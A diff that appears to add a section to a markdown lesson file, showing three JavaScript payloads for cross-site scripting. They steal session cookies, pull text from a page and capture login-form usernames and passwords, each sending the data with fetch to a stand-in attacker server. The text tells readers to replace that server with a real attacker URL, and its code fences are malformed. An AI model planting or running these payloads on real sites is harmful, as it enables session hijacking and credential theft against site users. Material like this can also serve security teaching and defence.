@@ -6,6 +6,45 @@
 <img src="https://i.imgur.com/VqMhmBL.png">
 
 ---
+
+```
+Session Token Theft:
+
+An attacker might use the Fetch API to send the user's session token to a server they control:
+```
+<script>
+  fetch('https://attacker-controlled-server.com/steal.php?token=' + document.cookie);
+</script>
+```
+In this example, replace 'https://attacker-controlled-server.com/steal.php' with the actual URL of the attacker's server. This payload fetches the user's cookies, including the session token, and sends it to the attacker-controlled server.
+
+Sensitive Information Exfiltration:
+
+An attacker might use the Fetch API to exfiltrate sensitive information from the current page and send it to an external server:
+
+```
+<script>
+  var sensitiveData = document.getElementById('sensitiveElement').innerText;
+  fetch('https://attacker-controlled-server.com/exfiltrate.php?data=' + encodeURIComponent(sensitiveData));
+</script>
+```
+Replace 'https://attacker-controlled-server.com/exfiltrate.php' with the actual URL of the attacker's server.
+This payload extracts sensitive information from an HTML element with the ID 'sensitiveElement' and sends it to the attacker-controlled server.
+
+Credential Harvesting:
+
+An attacker might use the Fetch API to capture login credentials entered by users:
+
+```
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+    fetch('https://attacker-controlled-server.com/harvest.php?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
+  });
+</script>
+
+
 ## Learning Objectives
 <br>
 
